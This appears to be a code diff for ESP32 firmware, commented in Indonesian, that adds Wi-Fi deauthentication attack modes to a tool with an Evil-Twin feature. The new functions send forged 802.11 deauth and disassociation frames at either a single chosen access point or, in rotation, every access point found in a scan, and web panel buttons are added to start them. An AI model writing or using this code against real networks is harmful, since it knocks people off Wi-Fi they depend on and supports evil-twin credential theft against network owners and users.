@@ -53,6 +53,9 @@ int8_t      targetIdx = -1;
 
 bool        twinOn = false;
 bool        deauthOn = false;
+bool        deauthAll = false;   // true = putar semua AP hasil scan
+uint8_t     rrIdx = 0;
+int8_t      singleIdx = -1;   // >=0 = mode tunggal (satu BSSID)
 uint32_t    sentFrames = 0;
 uint32_t    lastDeauth = 0;
 uint32_t    lastScan = 0;
@@ -184,10 +187,43 @@ void sendDeauth(uint8_t frameType, uint8_t reason, const uint8_t* bssid, uint8_t
   esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
 }
 
+void deauthSingleStep(){
+  if(singleIdx < 0 || singleIdx >= (int)apCount || aps[singleIdx].ch == 0) return;
+  esp_wifi_set_channel(aps[singleIdx].ch, WIFI_SECOND_CHAN_NONE);
+  delay(4);
+  const uint8_t* b = aps[singleIdx].bssid;
+  sendDeauth(0xC0, 7, b, aps[singleIdx].ch);
+  sendDeauth(0xC0, 1, b, aps[singleIdx].ch);
+  sendDeauth(0xA0, 7, b, aps[singleIdx].ch);
+  sendDeauth(0xA0, 1, b, aps[singleIdx].ch);
+  sendDeauth(0xC0, 2, b, aps[singleIdx].ch);
+  sentFrames += 5;
+}
+
+void deauthAllStep(){
+  for(uint8_t k = 0; k < MAX_AP; k++){
+    rrIdx = (rrIdx + 1) % MAX_AP;
+    if(rrIdx >= apCount || aps[rrIdx].ch == 0) continue;
+    esp_wifi_set_channel(aps[rrIdx].ch, WIFI_SECOND_CHAN_NONE);
+    delay(4);
+    const uint8_t* b = aps[rrIdx].bssid;
+    sendDeauth(0xC0, 7, b, aps[rrIdx].ch);
+    sendDeauth(0xC0, 1, b, aps[rrIdx].ch);
+    sendDeauth(0xA0, 7, b, aps[rrIdx].ch);
+    sendDeauth(0xA0, 1, b, aps[rrIdx].ch);
+    sendDeauth(0xC0, 2, b, aps[rrIdx].ch);
+    sentFrames += 5;
+    return;
+  }
+}
+
 void deauthStep(){
-  if(!deauthOn || targetIdx < 0) return;
+  if(!deauthOn) return;
+  if(!deauthAll && targetIdx < 0) return;
   if(millis() - lastDeauth < 400) return;
   lastDeauth = millis();
+  if(singleIdx >= 0){ deauthSingleStep(); return; }
+  if(deauthAll){ deauthAllStep(); return; }
 
   // tembak semua BSSID dengan SSID sama (2.4/5 GHz, repeater, mesh)
   uint8_t hit = 0;
@@ -301,6 +337,7 @@ String panelHtml(){
   h += ">"; h += twinOn ? "Stop Evil-Twin" : "Start Evil-Twin";
   h += "</button></form>";
 
+  h += "<form style='display:inline-block;padding-left:8px' method='post' action='/?deauth=all'><button style='background:#8a3b12'>Deauth Semua</button></form>";
   h += "<form style='display:inline-block;padding-left:8px' method='post' action='/?stop=1'><button>Stop Semua</button></form></div>";
 
   h += "<h1>P4nel</h1><table><tr><th>SSID</th><th>RSSI</th><th>BSSID</th><th>CH</th><th></th></tr>";
@@ -310,7 +347,8 @@ String panelHtml(){
     h += "<td><form method='post' action='/?ap=" + String(i) + "'>";
     h += (i == targetIdx) ? "<button style='background:#20c20e;color:#000'>Selected</button>"
                           : "<button>Select</button>";
-    h += "</form></td></tr>";
+    h += "</form><form style='display:inline' method='post' action='/?deauth=one&i=" + String(i) + "'>"
+         "<button style='background:#8a3b12;margin-left:4px'>Deauth</button></form></td></tr>";
   }
   h += "</table><br>";
 
@@ -438,8 +476,21 @@ void handleRoot(){
   }
 
   if(web.hasArg("deauth")){
-    deauthOn = (web.arg("deauth") == "start") && targetIdx >= 0;
-    oledStatus(deauthOn ? "deauth ON" : "deauth off");
+    String d = web.arg("deauth");
+    if(d == "one"){
+      int i = web.arg("i").toInt();
+      if(i < 0 || i >= (int)apCount){ web.send(400, "text/plain", "AP tidak ada"); return; }
+      singleIdx = i; targetIdx = i; deauthAll = false; deauthOn = true;
+    } else if(d == "all"){
+      if(apCount == 0) doScan();
+      singleIdx = -1; deauthAll = true; deauthOn = true; rrIdx = 0;
+    } else if(d == "start"){
+      singleIdx = -1;
+      deauthAll = false; deauthOn = (targetIdx >= 0); rrIdx = 0;
+    } else {
+      deauthOn = false; deauthAll = false; singleIdx = -1;
+    }
+    oledStatus(deauthOn ? (deauthAll ? "deauth SEMUA" : "deauth target") : "deauth off");
     web.send(200, "text/html", panelHtml());
     return;
   }
